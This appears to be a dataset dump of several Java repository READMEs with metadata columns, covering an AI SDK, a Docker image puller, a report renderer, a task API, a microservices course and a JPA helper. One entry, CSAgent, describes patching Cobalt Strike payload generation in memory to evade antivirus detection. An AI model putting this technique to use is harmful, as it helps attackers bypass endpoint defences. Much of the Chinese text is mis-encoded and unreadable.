5. å®Œæˆæ‹‰å–è¯·æ±‚è¡¨å•ï¼Œç¡®ä¿åœ¨`dev`åˆ†æ”¯è¿›è¡Œæ”¹åŠ¨ï¼Œé“¾æ¥åˆ°æ‚¨çš„ PR è§£å†³çš„é—®é¢˜ã€‚

# æ”¯æŒ
å¦‚æœæ‚¨è§‰å¾—è¿™ä¸ªé¡¹ç›®å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œè¯·ç‚¹ä¸€ä¸ªstarâ­ã€‚


# è´¡çŒ®è€…

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/LnYo-Cly/ai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=LnYo-Cly/ai4j"" />
</a>


# â­ï¸ Star History
<a href=""https://star-history.com/#LnYo-Cly/ai4j&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
 </picture>
</a>",11,1,2,6.0,"['gradle', 'maven', 'rag', 'pr', 'star', 'history']","['gradle', 'maven', 'rag', 'pr', 'star']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0
LDAx2012/CSAgent,master,"# CSAgent
  Bypass antivirus software by patching the CS payload in memory through the agent.

  



### WHAT	

â€‹	é€šè¿‡agentä¿®æ”¹beacon.BeaconPayload#exportBeaconStageä¸pe.MalleablePE#processæ–¹æ³•æ¥åœ¨CSç”Ÿæˆpayloadçš„è¿‡ç¨‹ä¸­å»é™¤å®ƒçš„å†…å­˜ç‰¹å¾ï¼Œä½¿å…¶ç”Ÿæˆå³å…æ€ï¼Œå¹¶ç»•è¿‡å†…å­˜æŸ¥æ€ã€‚


### HOW
  CodeFile.javaä¸­å­˜æ”¾äº†CSä¸­beacon.dllä¸payloadçš„ç‰¹å¾å­—èŠ‚ä¸æ›¿æ¢å­—èŠ‚ï¼ŒCSåˆ™æ˜¯é¡¹ç›®æºç 
â€‹	ç¼–è¯‘é¡¹ç›®ï¼Œåœ¨CSå¯åŠ¨å‚æ•°ä¸­æ·»åŠ  -javaagent:CS.jar ï¼Œå°†CodeFile0.javaä¸CodeFile1.javaæ”¾åˆ°åŒç›®å½•ä¸‹ï¼Œå¯åŠ¨CSï¼Œæ­£å¸¸ç”Ÿæˆpayload


### ToDo
- ç›®å‰ä»…æ”¯æŒx64ï¼Œä¹Ÿè®¸ä¼šå†æ€»ç»“ä¸‹32ä½çš„ç‰¹å¾
- åƒyaraè§„åˆ™ä¸€æ ·æ”¯æŒé€šé…ç¬¦
- ç›´æ¥å†™ç‰¹å¾å¤ªä¸ä¼˜é›…ï¼Œå†™æˆyaraé‚£æ ·çš„é…ç½®æ–‡ä»¶ï¼Œæ”¯æŒæè¿°ä¹‹ç±»çš„
- æ”¯æŒåŠ¨æ€ä¿®æ”¹é…ç½®ç­‰åŠŸèƒ½
- https TCP DNSç­‰æ›´å¤šæµ‹è¯•
",1,0,1,0.0,"['csagent', 'what', 'how', 'todo']","['csagent', 'what', 'how', 'todo']",1.0,[],0.0,1.0,0.0
FT-Fetters/DockerPull,master,"# Docker pull

## ä½¿ç”¨æ–¹æ³• Usage

```shell
# image: nginx:latest
# proxyUrl 127.0.0.1
# proxyPort 7890
java -jar docker-pull.jar <image> <proxyUrl> <proxyPort>
```

é€šè¿‡è¯¥å‘½ä»¤åœ¨ä¸‹è½½å¹¶æ‰“åŒ…å®Œæ¯•åï¼Œä½ å¯ä»¥åœ¨ jar åŒ…ç›®å½•ä¸‹çš„imagesæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°é•œåƒæ–‡ä»¶

After the download and packaging are complete, you can find the downloaded image in the image directory under the jar package.

ä½ ä¹Ÿå¯ä»¥ç›´æ¥å¯åŠ¨ç½‘é¡µç«¯è¿›è¡Œå›¾å½¢åŒ–æ“ä½œï¼Œä»¥ä¸‹æ˜¯å¯åŠ¨çš„å‘½ä»¤

Or you can use web page

```shell
java -jar docker-pull.jar --web
```

æ‰“å¼€æµè§ˆå™¨å¹¶è¾“å…¥åœ°å€ http://localhost:1111

Open url http://localhost:1111

è¿›å…¥é¡µé¢åæŸ¥æ‰¾ä½ è¦çš„é•œåƒå¹¶é€‰æ‹©ç‰ˆæœ¬åŠç³»ç»ŸèŠ¯ç‰‡æ¶æ„ç­‰ä¿¡æ¯å¹¶é€‰æ‹©æ‹‰å»ï¼Œç„¶åä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ä¸‹è½½åˆ—è¡¨é‡Œé¢çš„ä¸Šä¼ æŒ‰é’®ç›´æ¥ä¸Šä¼ åˆ°ä½ çš„æœåŠ¡å™¨ä¸Š

Search your image and download then you can upload to you server
## Docker

é»˜è®¤ä¸‹è½½çš„é•œåƒæ–‡ä»¶é»˜è®¤ä»¥ .gz ç»“å°¾ï¼Œéœ€è¦æ”¹æˆ .tar

The extracted image is by default ending with .gz, and it needs to be changed to end with .tar.

```shell
# example: image file name 'nginx_latest.tar'
docker load < nginx_latest.tar
```

## è´¡çŒ® Contribute

æ„Ÿè°¢ [nimastudent](https://github.com/nimastudent) æä¾›çš„å‰ç«¯é¡µé¢æ”¯æŒ

Thanks to [nimastudent](https://github.com/nimastudent) for the front-end support

## License

MIT Â© [Fetters](LICENSE)

",4,1,3,4.0,"['docker', 'pull', 'usage', 'image', 'nginx', 'late', 'proxyurl', 'proxyport', 'docker', 'example', 'image', 'file', 'name', 'contribute', 'license']","['docker', 'image', 'pull', 'usage', 'nginx']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
52jing/wang-template-backend,master,"<h4 align=""right""><strong>English</strong> | <a href=""./README_zh.md"">ç®€ä½“ä¸­æ–‡</a></h4>

<p align=""center"">
   <img src=""https://img.shields.io/badge/license-Apache-blue.svg"" alt=""license"">
   <img src=""https://img.shields.io/badge/JDK-8+-green.svg"" alt=""jdk"">
   <img src=""https://img.shields.io/badge/Spring%20Boot-2.7-blue.svg"" alt=""springboot"">
</p> 

# Wang-Template: A Template Based Report Render Platform

## Introduction

This system is a report rendering module extracted from the actual production platform, as a stand-alone report generation system.

This system is BS architecture, this project is a backend service: 

- Github: [https://github.com/52jing/wang-template-backend](https://github.com/52jing/wang-template-backend)
- Gitee: [https://gitee.com/i52jing/wang-template-backend](https://gitee.com/i52jing/wang-template-backend)

Frontend service at:

- Github: [https://github.com/52jing/wang-template-admin](https://github.com/52jing/wang-template-admin)
- Gitee: [https://gitee.com/i52jing/wang-template-admin](https://gitee.com/i52jing/wang-template-admin)

## Features

1. Lightweight

```
This system only focuses on report generation, which can interface with any data source and generate corresponding reports through customized templates.
```

2. Extensible

```
The system adopts a modular architecture and an interface-oriented design, which makes it easy to quickly extend other data sources and rendering methods.
```

3. Easy Integration

```
Easily integrated into other systems as a module for report generation functions.
```

4. More Intelligent

```
Integration of AIGC services provides smarter report generation capabilities.
```

## Core Tech Stack

| Tech        | Version |
|-------------|---------|
| Java        | 8+      |
| Spring      | 5.3.31  |
| Spring Boot | 2.7.18  |

### Supported data source types

- Relational database SQL: supports querying data from relational databases, and data querying is realized through JDBC interface. Among them, MySQL, Postgresql and H2 have been verified and tested.

### Supported report types

- Word Report: Use [poi-tl](https://deepoove.com/poi-tl/) to support Word templates to generate Word reports.
- Text Report: Use [FreeMarker](https://freemarker.apache.org/) to support arbitrary text reports, generating text reports, such as TXT, Markdown, HTML and so on.

## Structures

```
WangTemplateBackend
|-- app  -- Report rendering module
|-- design  -- Database design files
|-- framework  -- Framework module
|-- report  -- Unit tests aggregation report
|-- system  -- System management module
|-- task  -- Task management module
```

## Deployment

### Quick Start

Use docker compose to quickly deploy:

- Github: [https://github.com/52jing/wang-template-compose](https://github.com/52jing/wang-template-compose)
- Gitee: [https://gitee.com/i52jing/wang-template-compose](https://gitee.com/i52jing/wang-template-compose)

### Deploy Backend

#### Docker

Build Image

```
docker build -t wang-template-backend:1.0 .
```

Mount config file and start container

```
docker run -d --name wang-template-backend -p 8000:8000 -v <path-to-config>/application-prod.yml:/opt/config/application-prod.yml wang-template-backend:1.0
```

#### Manually

Package by Maven

```
mvn clean package -DskipTests
```

Jar file is under app/target/app.jar, add config file and start jar.

### Deploy Frontend

#### Docker

Build Image

```
docker build -t wang-template-admin:1.0 .
```

Start Container

```
docker run -d --name wang-template-admin -p 8001:80 wang-template-admin:1.0
```

#### Manually

Build by Vite

```
yarn build
```

Files are under dist/spa directory.

Note: Since the frontend defaults to the same domain and port for backend services, you need to use a front load-balancing proxy, or configure the backend request base path when build the frontend (see Environment Variables).

## Snapshots

### Configure Datasource

![configure datasource](./images/1.png)

### Configure Datasource Parameters

![configure datasource parameters](./images/2.png)

### Datasource Detail

![datasource detail](./images/3.png)

### Test to retrieve data

![test to retrieve data](./images/4.png)

### Configure Template

![configure template](./images/5.png)

The template file is shown below

![template file](./images/template.png)

### Create generation task (select data source, template, enter parameters)

![create task](./images/6.png)

### View Results

![view results](./images/7.png)

The report generated is shown below

![generated report](./images/report.png)

## Configuration File Description

### Configuration File

Add configuration file `application-prod.yml` or `application-prod.properties`, can refer to `app/src/main/resources/example-application-dev.yml`.

### Configure Database

Configure under `spring.datasource.druid` or `mybatis-flex.datasource.master`.

Example:

```yaml
spring:
  flyway:
    # Enable flyway to migrate
    enabled: true
    # Note to change to the corresponding database directory
    # If there is no corresponding database, you can use PDManer to generate a database with design files.
    locations:
      - classpath:db/migration/mysql

mybatis-flex:
  # configure datasource
  datasource:
    # master datasource
    master:
      url: jdbc:mysql://localhost:3306/wb-template-dev?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
      username: root
      password: 123456
      # The following Druid parameters can be configured according to actual requirements
      # Initial connection pool size
      initial-size: 5
      # max active connection pool size
      max-active: 20
      # min connection pool size
      min-idle: 5
```

Supported databases for service (the following databases have been tested):

- MySQL 8
- MySQL 5 (Since Flyway doesn't support it, it needs to be executed manually for migration in `db.migration/mysql` and disable flyway)
- Postgresql
- H2

### Configure Attachment Storage

It depends on [x-file-storage](https://x-file-storage.xuyanwu.cn/#/), support local files, MinIO and cloud service storage, please refer to the official documentation.

Example

```yaml
dromara:
  x-file-storage: # Storage configuration
    default-platform: local-plus-1 # default platform
    thumbnail-suffix: "".min.jpg"" # thumbnail
    # storage platform configuration
    local-plus:
      - platform: local-plus-1 # name
        enable-storage: true  # enabled
        enable-access: true # enable access
        domain: http://127.0.0.1:8080/file/ # domain
        base-path: local-plus/ # base path
        path-patterns: /file/** # access path
        storage-path: ./data # storage directory
```

### Configure Report Analysis (AI)

```yaml
analysis:
  # enable indicator analysis
  indicatorAnalysis: true
  # use kimi cloud service, please use  Kimi API access key, refer to https://platform.moonshot.cn/docs/intro#%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97
  moonShot:
    accessToken:
```

## Template Introduction

### Template Context Data

All templates are injected with a rendered context object, which has the following format:
```json5
{
  ""templateName"": """",  // template name
  ""datasourceName"": """",  // datasource name
  ""params"": {},  // render parameters
  ""envs"": {  // environments
    ""year"": 2024,  // year
    ""month"": 6,  // month
    ""day"": 12,  // day
    ""dayOfWeek"": 3,  // day of week
    ""hour"": 0,  // hour
    ""minute"": 0,  // minute
    ""second"": 0  // second
  },
  ""data"": {}  // data obtained from a data source, which may be an array or an object
}
```

To use it in the template like this: `${envs.year}`ã€‚

### Word Template

Word template depends on [poi-tl](https://deepoove.com/poi-tl/) , the syntax can be found in the official documentation. The variables use `${name}` styleã€‚

### Text Template

Text template depends on [FreeMarker](https://freemarker.apache.org/) , the syntax tan be found in the official documentation.

## Follow-up Plan

- Support for more data sources
- Adding timed tasks and generating schedules
- Integrate more AI capabilities
",0,0,1,0.0,"['a', 'template', 'base', 'report', 'render', 'platform', 'introduction', 'feature', 'core', 'tech', 'stack', 'support', 'data', 'source', 'type', 'support', 'report', 'type', 'structure', 'deployment', 'quick', 'start', 'deploy', 'backend', 'docker', 'manually', 'deploy', 'frontend', 'docker', 'manually', 'snapshot', 'configure', 'datasource', 'configure', 'datasource', 'parameter', 'datasource', 'detail', 'test', 'retrieve', 'data', 'configure', 'template', 'create', 'generation', 'task', 'select', 'data', 'source', 'template', 'enter', 'parameter', 'view', 'result', 'configuration', 'file', 'description', 'configuration', 'file', 'configure', 'database', 'enable', 'flyway', 'migrate', 'note', 'change', 'correspond', 'database', 'directory', 'if', 'corresponding', 'database', 'use', 'pdmaner', 'generate', 'database', 'design', 'file', 'configure', 'datasource', 'master', 'datasource', 'the', 'following', 'druid', 'parameter', 'configure', 'accord', 'actual', 'requirement', 'initial', 'connection', 'pool', 'size', 'max', 'active', 'connection', 'pool', 'size', 'min', 'connection', 'pool', 'size', 'configure', 'attachment', 'storage', 'storage', 'configuration', 'default', 'platform', 'thumbnail', 'storage', 'platform', 'configuration', 'name', 'enable', 'enable', 'access', 'domain', 'base', 'path', 'access', 'path', 'storage', 'directory', 'configure', 'report', 'analysis', 'ai', 'enable', 'indicator', 'analysis', 'use', 'kimi', 'cloud', 'service', 'please', 'use', 'kimi', 'api', 'access', 'key', 'refer', 'http', 'bd', 'bf', 'template', 'introduction', 'template', 'context', 'data', 'word', 'template', 'text', 'template', 'plan']","['configure', 'template', 'datasource', 'data', 'configuration']",6.0,"[com.diffplug.spotless:spotless-maven-plugin,maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,2.0
KirDemorgan/desaAPI,master,"# DesaAPI

DesaAPI is a RESTful API for managing projects, task columns, and tasks. It is built using Java, Spring Boot, and JPA with a Maven build system.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
    - [Projects](#projects)
    - [Task Columns](#task-columns)
    - [Tasks](#tasks)
- [Contributing](#contributing)
- [License](#license)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/KirDemorgan/desaAPI.git
    cd desaAPI
    ```

2. Build the project using Maven:
    ```sh
    mvn clean install
    ```

3. Run the application:
    ```sh
    mvn spring-boot:run
    ```

## Usage

The API can be accessed at `http://localhost:8080/api`.

## API Endpoints

### Projects

- **Get all projects**
    ```http
    GET /api/projects
    ```
  **Query Parameters:**
    - `prefix_name` (optional): Filter projects by name prefix.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Project 1"",
            ""taskColumnIds"": [1, 2]
        },
        ...
    ]
    ```

- **Create or update a project**
    ```http
    POST /api/projects
    ```
  **Request Parameters:**
    - `project_id` (optional): ID of the project to update.
    - `project_name` (optional): Name of the project.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Project 1"",
        ""taskColumnIds"": [1, 2]
    }
    ```

- **Delete a project**
    ```http
    DELETE /api/projects/{projectId}
    ```
  **Path Parameters:**
    - `projectId`: ID of the project to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Project with id 1 deleted successfully""
    }
    ```

### Task Columns

- **Change task column position**
    ```http
    PATCH /api/task_columns/{task_column_id}/position
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to update.

  **Request Parameters:**
    - `task_column_new_position`: New position of the task column.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Column 1"",
        ""position"": 2,
        ""tasks"": [...]
    }
    ```

- **Delete a task column**
    ```http
    DELETE /api/task_columns/{task_column_id}
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task column with id 1 deleted successfully""
    }
    ```

### Tasks

- **Get all tasks in a column**
    ```http
    GET /api/projects/{task_column_id}/tasks
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Task 1"",
            ""description"": ""Description 1"",
            ""taskColumnId"": 1
        },
        ...
    ]
    ```

- **Create a task**
    ```http
    POST /api/projects/{task_column_id}/task
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Task 1"",
        ""optionalTaskDescription"": ""Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Task 1"",
        ""description"": ""Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Update a task**
    ```http
    PATCH /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to update.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Updated Task 1"",
        ""optionalTaskDescription"": ""Updated Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Updated Task 1"",
        ""description"": ""Updated Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Delete a task**
    ```http
    DELETE /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task with id 1 deleted successfully""
    }
    ```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any changes.

## License

This project is licensed under the MIT License.",0,0,2,0.0,"['desaapi', 'table', 'content', 'installation', 'usage', 'api', 'endpoint', 'project', 'task', 'column', 'task', 'contribute', 'license']","['task', 'desaapi', 'table', 'content', 'installation']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
SaiUpadhyayula/spring-boot-3-microservices-course,master,"# Spring Boot Microservices
This repository contains the latest source code of the spring-boot-microservices tutorial

You can watch the tutorial on Youtube [here](https://youtu.be/yn_stY3HCr8?si=EjrBEUl0P-bzSWRG)

## Services Overview

- Product Service
- Order Service
- Inventory Service
- Notification Service
- API Gateway using Spring Cloud Gateway MVC
- Shop Frontend using Angular 18

## Tech Stack

The technologies used in this project are:

- Spring Boot
- Angular
- Mongo DB
- MySQL
- Kafka
- Keycloak
- Test Containers with Wiremock
- Grafana Stack (Prometheus, Grafana, Loki and Tempo)
- API Gateway using Spring Cloud Gateway MVC
- Kubernetes


## Application Architecture
![image](https://github.com/user-attachments/assets/d4ef38bd-8ae5-4cc7-9ac5-7a8e5ec3c969)

## How to run the frontend application

Make sure you have the following installed on your machine:

- Node.js
- NPM
- Angular CLI

Run the following commands to start the frontend application

```shell
cd frontend
npm install
npm run start
```
## How to build the backend services

Run the following command to build and package the backend services into a docker container

```shell
mvn spring-boot:build-image -DdockerPassword=<your-docker-account-password>
```

The above command will build and package the services into a docker container and push it to your docker hub account.

## How to run the backend services

Make sure you have the following installed on your machine:

- Java 21
- Docker
- Kind Cluster - https://kind.sigs.k8s.io/docs/user/quick-start/#installation

### Start Kind Cluster
    
Run the k8s/kind/create-kind-cluster.sh script to create the kind Kubernetes cluster

```shell
./k8s/kind/create-kind-cluster.sh
```
This will create a kind cluster and pre-load all the required docker images into the cluster, this will save you time downloading the images when you deploy the application.

### Deploy the infrastructure

Run the k8s/manisfests/infrastructure.yaml file to deploy the infrastructure

```shell
kubectl apply -f k8s/manifests/infrastructure.yaml
```

### Deploy the services

Run the k8s/manifests/applications.yaml file to deploy the services

```shell
kubectl apply -f k8s/manifests/applications.yaml
```

### Access the API Gateway

To access the API Gateway, you need to port-forward the gateway service to your local machine

```shell
kubectl port-forward svc/gateway-service 9000:9000
```

### Access the Keycloak Admin Console
To access the Keycloak admin console, you need to port-forward the keycloak service to your local machine

```shell
kubectl port-forward svc/keycloak 8080:8080
```

### Access the Grafana Dashboards
To access the Grafana dashboards, you need to port-forward the grafana service to your local machine

```shell
kubectl port-forward svc/grafana 3000:3000
```
",0,2,2,1.0,"['spring', 'boot', 'microservices', 'service', 'overview', 'tech', 'stack', 'application', 'architecture', 'how', 'run', 'frontend', 'application', 'how', 'build', 'backend', 'service', 'how', 'run', 'backend', 'service', 'start', 'kind', 'cluster', 'deploy', 'infrastructure', 'deploy', 'service', 'access', 'api', 'gateway', 'access', 'keycloak', 'admin', 'console', 'access', 'grafana', 'dashboard']","['service', 'how', 'access', 'application', 'run']",6.0,"[org.apache.avro:avro-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0
graalvm/graal-languages-demos,main,"# Graal Languages - Demos and Guides

This repository contains demo applications and guides for [GraalJS](./graaljs), [GraalPy](./graalpy/), [GraalWasm](./graalwasm), and other Graal Languages.
Each demo and guide includes a _README.md_ that explains how to run the application and how it works in more detail.

## Help

If you need help with any of the demos or guides, please [file a GitHub issue](https://github.com/graalvm/graal-languages-demos/issues/new).

## Contributing

This project welcomes contributions from the community. Before submitting a pull request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security vulnerability disclosure process.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.
",0,0,1,6.0,"['graal', 'language', 'demo', 'guide', 'help', 'contribute', 'security', 'license']","['graal', 'language', 'demo', 'guide', 'help']",16.0,"[com.github.eirslett:frontend-maven-plugin,io.micronaut.maven:micronaut-maven-plugin,maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:wagon-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.graalvm.python:graalpy-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,13.0,0.0
westwong/westDao,master,"# Wise Exectution  Simple Tools

## [WestDao](https://github.com/westwong/westDao)

[English](https://github.com/westwong/westDao/blob/master/README-en.md)

æ¬¢è¿æ¥åˆ° WestDaoï¼è¿™ä¸ªé¡¹ç›®æ—¨åœ¨ ç”¨æ›´å°‘çš„ä»£ç å®Œæˆæ—¥å¸¸å¼€å‘å·¥ä½œï¼Œç›´æ¥ç»™å‡ºDEMO

```java
@RestController
public class WestUserController {
    @PostMapping(""/user/save"")
    public Result<Object> saveUser(@RequestBody WestUser user) {
        user.setAvatar(""default.png"").save();
        return Result.successResult();
    }
}
```

å‡ è¡Œä»£ç ï¼Œä¾¿å®Œæˆäº†ç”¨æˆ·ä¿¡æ¯ä¿å­˜

```java
    @PostMapping(""/user/delete"")
    public Result<Object> deleteById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        boolean success = user.deleteById();
        return Result.successResult(success);
    }
    @RequestMapping(""/user/find"")
    public Result<Object> findById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        User User = user.findById();
        return Result.successResult(User);
    }
	@RequestMapping(""/v3/user/find"")
	public Result<Object> findByIdV3(User user) {
    	Assert.notNull(user.getId(), ""id is required"");
    	User db = new WestUser(user).findById();
    	return Result.successResult(db);
	}	
    @PostMapping(""/user/update"")
    public Result<Object> updateById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        user.updateById();
        return Result.successResult();
    }
```

åŒç†ï¼Œåˆ ã€æŸ¥ã€æ”¹ä¹Ÿä¸ä¼šæ‰é“¾å­

### ä»‹ç»

[westDao](https://github.com/westwong/westDao/tree/master/WestDaoCore)æ˜¯åŸºäº[Spring Data JPA](https://spring.io/projects/spring-data-jpa)å®Œæˆçš„æŒä¹…å±‚æ¡†æ¶ï¼Œå¹¶ä¸”å€Ÿé‰´äº†[MyBatis-plus](https://baomidou.com/) çš„ä»£ç é£æ ¼ï¼Œèƒ½å¤ŸåŠ¨æ€çš„ç”Ÿæˆ[JPQL](https://docs.oracle.com/cd/E29542_01/apirefs.1111/e13946/ejb3_langref.html)ï¼Œ

å®Œæ•´çš„ä¿ç•™JPAçš„åŸç”Ÿå±æ€§ï¼Œä½ åœ¨äº«å—JPAæ— è¡¨ç®¡ç†çš„æ–¹ä¾¿ä¹‹ä½™ï¼Œä¹Ÿèƒ½æ„Ÿå—åˆ°å¦‚MyBatis-plusèˆ¬çš„é“¾å¼ä»£ç ï¼Œå¼ºå¤§JPQLè®©ä½ å¯¹å¹³å°å…¼å®¹æ€§å†æ— åé¡¾ä¹‹å¿§

```java
 private static LambdaQuery<User> getJPQL(TestDto dto) {
        return West.<User>queryJPQL()
                .eq(dto.isEq(), User::getId, 20L)
            	// å¯¹äºorè°ƒç”¨ä¸“é—¨è¯´ä¸€ä¸‹ï¼Œå› ä¸ºJPAåŸå§‹æ¡†æ¶çš„åŸå›  JPQL or()çš„æ‹¬å·ä¼šè¢«çœå»ï¼Œè°ƒè¯•æ—¶æ³¨æ„
                .or(dto.isOr(), (q -> q.eq(User::getId, 18L).eq(User::getName, dto.getName())
                ))
                .and(dto.isAnd(), (q -> q.eq(User::getId, 18L).or(q1 -> q1.eq(User::getName, dto.getName()))
                ))
                .ne(dto.isNe(), User::getAge, 79)
                .le(dto.isLe(), User::getAge, 20)
                .ge(dto.isGe(), User::getAge, 80)
                .between(dto.isBetween(), User::getAge, 20, 80)
                .notBetween(dto.isNotBetween(), User::getAge, 20, 80)
                .like(dto.isLike(), User::getName, ""ru"")
                .likeLeft(dto.isLikeLeft(), User::getName, ""ac"")
                .likeRight(dto.isLikeRight(), User::getName, ""da"")
                .in(dto.isIn(), User::getAge, Arrays.asList(20, 21, 22))
                .notIn(dto.isNotIn(), User::getAge, Arrays.asList(20, 21, 22))
                .isNull(dto.isWasNull(), User::getName)
                .isNotNull(dto.isWasNotNull(), User::getName)
                .inJPQL(dto.isInJpql(), User::getName, ""select nickName from UserInfo where id = 1"");
    }
```

```
@RequestMapping(""/v1/user/update"")
public Result<Object> updateToPrams(WestUser user) {
    int num = user.update(
            West.updateJPQL(User.class).update(new User().setAge(10)).eq(User::getId, 20L)
    );
    return Result.successResult(num);
}
```

æ€»ä¹‹ä¸€ä¸ªæ€æƒ³ï¼Œå¯¹è±¡è‡ªå·±å¤„ç†è‡ªå·±ï¼Œè‡ªå·±ç»™è‡ªå·±æä¾›ä¸€åˆ‡æŒä¹…å±‚æ–¹æ³•ï¼Œä½ ä¸ç”¨å…³å¿ƒå¦‚ä½•è°ƒç”¨ï¼ˆ**Wise Exection**ï¼‰

åªç®¡å†™ï¼ˆ**Simple Tools**)

å½“ç„¶æˆ‘åŒæ ·ä¹Ÿå¯¹é“¾å¼è°ƒç”¨èµ‹äºDAOèƒ½åŠ›

```java
@RequestMapping(""/v2/user/update"")
@Transactional
public Result<Object> updateToPramsV2(User user) {
    int execute = West.updateJPQL(user).eq(User::getId, 20L).execute();
    return Result.successResult(execute);
}
@RequestMapping(""/v2/user/findAll"")
public Result<Object> findALLV2(TestDto dto) {
    Map<String, Object> count = getJPQL(dto).select(""count(1) as total"").getMap();
    Map<String, Object> sum = getJPQL(dto).select(""sum(age) as total"").getMap();
    Map<String, Object> map = getJPQL(dto).getMap();
    List<Map<String, Object>> maps = getJPQL(dto).listMap();

    User entity = getJPQL(dto).getEntity();
    List<User> users = getJPQL(dto).listEntity();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""count"", count);
    result.put(""sum"", sum);
    result.put(""map"", map);
    result.put(""maps"", maps);
    result.put(""entity"", entity);
    result.put(""users"", users);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/page"")
public Result<Object> pageV2(TestDto dto) {
    Page<User> pageUser = getJPQL(dto).pageEntity(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Page<Map<String, Object>> pageMap = getJPQL(dto).pageMap(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Map<String, Object> result = new HashMap<>(4);
    result.put(""map"", pageMap);
    result.put(""users"", pageUser);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/deleteAll"")
@Transactional
public Result<Object> deleteAllV2(User user) {
    int execute = West.deleteJPQL(user).execute();
    int execute1 = West.<User>deleteJPQL().execute();
    return Result.successResult(execute);
}

// å¯¹group limit orderBYçš„æ”¯æŒ
@RequestMapping(""/v2/user/list"")
public Result<Object> listV2() {
    List<User> orderBY = West.<User>queryJPQL()
            .orderByDesc(User::getAge)
            .orderByAsc(User::getId)
            .limit(10)
            .listEntity();
    List<Map<String, Object>> group = West.<User>queryJPQL()
         // age ä¸ç»™åˆ«åå°±ä¼šé»˜è®¤ä¸º 'colnum0'
            .select(""age as age, count(1) as num"")
            .groupBy(User::getAge)
            .having(""age > 10"")
            .orderByAsc(User::getAge)
            .listMap();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""orderBY"", orderBY);
    result.put(""group"", group);
    return Result.successResult(result);
}
```

